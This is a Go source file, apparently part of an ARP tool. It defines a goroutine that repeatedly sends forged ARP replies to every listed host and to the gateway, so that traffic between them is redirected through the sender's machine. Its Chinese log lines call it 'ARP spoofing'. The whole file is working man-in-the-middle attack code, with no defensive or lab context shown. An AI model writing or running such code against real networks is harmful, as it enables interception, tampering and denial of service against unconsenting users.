package arp

import (
	"arp/model"
	"context"
	"log"
	"net"
	"time"
)

func (r *Route) Snooping() {
	go func(ctx context.Context) {
		r.wg.Wait()
		log.Println("启动了一个ARP欺骗协程")
		defer log.Println("ARP欺骗协程退出:")
		//开始发ARP欺骗包
		t := time.NewTicker(time.Millisecond * 500)
		defer t.Stop()
		for range t.C {
			r.mutex.Lock()
			for _, host := range r.Hosts {
				dstMAC, _ := net.ParseMAC(host.MAC)
				dstIP := net.ParseIP(host.IP).To4()
				err := r.SendARP(r.gateWayIP, dstIP, model.Reply, r.srcMAC, dstMAC)
				if err != nil {
					log.Println("sent arp reply failed,", err)
				}
				err = r.SendARP(dstIP, r.gateWayIP, model.Reply, r.srcMAC, r.gateWayMac)
				if err != nil {
					log.Println("sent arp reply failed,", err)
				}
			}
			r.mutex.Unlock()
			select {
			case <-ctx.Done():
				return
			default:
			}
		}
	}(r.ctx)
	return
}
